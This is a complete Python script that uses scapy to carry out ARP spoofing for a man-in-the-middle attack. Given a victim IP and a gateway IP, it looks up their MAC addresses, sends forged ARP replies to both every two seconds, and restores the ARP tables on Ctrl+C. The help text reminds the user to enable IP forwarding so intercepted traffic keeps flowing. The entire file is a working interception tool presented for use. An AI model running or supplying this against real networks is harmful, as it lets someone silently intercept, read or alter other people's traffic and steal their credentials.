#!/usr/bin/env python3
# Author Gemstone HashGhost

import scapy.all as scapy 
import time
import argparse

def get_arguments():
    parser =  argparse.ArgumentParser(
        prog='ARP Spoofing',
        description='This program performs Man in the Middle Attack, all the dst fields get victim details and src field gets the fetch detail', 
        epilog='Remember to add echo 1 > /proc/sys/net/ipv4/ip_forward to your Linux Machine to allow ip forwarding'
        )
    parser.add_argument('-t', '--target', dest='target_ip',  help='Victim IP')
    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Router IP / Gateway IP')

    args = parser.parse_args()

     # If statement condition for error control
    if not args.target_ip:
        parser.error("[-] Please specify Victim IP, use --help for more information")
    elif not args.gateway_ip:
        parser.error("[-] Please specify Router Gateway, use --help for more information")
    return args

def get_mac(ip):
    ''' The first ARP will asks for only 0.0.0.0 but no specific ip'''
    # scapy.ls(scapy.ARP())
    # arp_request = scapy.ARP()
    # print(arp_request.summary())

    arp_request = scapy.ARP(pdst=ip) # Obtain the specific ip, "Who has this ip"
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Setting Broadcast MAC 
    arp_request_broadcast = broadcast/arp_request     # Generation new frame by combining both ip and mac
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(victim_ip, router_ip):
    target_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet, verbose=False)

def restore(og_source_ip, og_destination_ip):
    source_mac = get_mac(og_source_ip)
    destination_mac = get_mac(og_destination_ip)
    packet = scapy.ARP(op=2, pdst=og_destination_ip, hwdst=destination_mac, psrc=og_source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

'''
The loop will make the response to persist without terminating and keep spoofing continuosly
'''

# Use variable names as declared in the add_argument example args.target_ip
args = get_arguments()

try:
    packet_count = 0
    while True:
        spoof(args.target_ip, args.gateway_ip)
        spoof(args.gateway_ip, args.target_ip)
        packet_count = packet_count + 2
        print("\r[+] Packet Sent : " + str(packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt, CTRL + C Quitting... Wait a little")
    restore(args.target_ip, args.gateway_ip)
    restore(args.gateway_ip, args.target_ip)
